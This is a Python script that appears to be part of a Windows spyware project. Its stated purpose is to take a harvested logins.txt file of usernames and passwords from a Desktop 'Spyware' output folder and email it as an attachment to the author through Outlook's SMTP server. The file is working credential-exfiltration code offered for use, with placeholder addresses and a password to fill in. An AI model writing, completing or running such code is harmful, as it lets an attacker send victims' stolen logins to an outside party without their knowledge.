#!/usr/bin/env python
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import os
import winshell

"""
This script gets the logins.txt file containing usernames and passwords and sends it to my email 
using outlook smtp server and email.mime lirary
"""
def send ():
    try:
        file_name = winshell.desktop() + r"\Spyware\Output"
        file_name = file_name.replace('\\','/') + "/logins.txt"

        file_exists = os.path.isfile(file_name)
        
        # if the file exist then send it, otherwise skip
        if file_exists:

            fromaddr = "sender's email"
            toaddr = "receiver's email"
            
            # Set From, to, Subject, and Email body
            msg = MIMEMultipart()
            
            msg['From'] = fromaddr
            msg['To'] = toaddr
            msg['Subject'] = "List of interesting stuff - Spicy"
            
            body = "Freshly sent spicy list!!!"
            
            # set attachment to the email
            msg.attach(MIMEText(body, 'plain'))
            
            attachment = open(file_name, "rb")
            
            part = MIMEBase('application', 'octet-stream') # it means I am sending binary file
            part.set_payload((attachment).read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', "attachment; filename= %s" % file_name)
            
            msg.attach(part)
            
            # set smtp server
            server = smtplib.SMTP('smtp-mail.outlook.com', 587) # change this if you are not using outlook emails
            server.starttls()
            server.login(fromaddr, "sender's password")
            text = msg.as_string()
            server.sendmail(fromaddr, toaddr, text)
            server.quit()

    except Exception:
        print("Failed")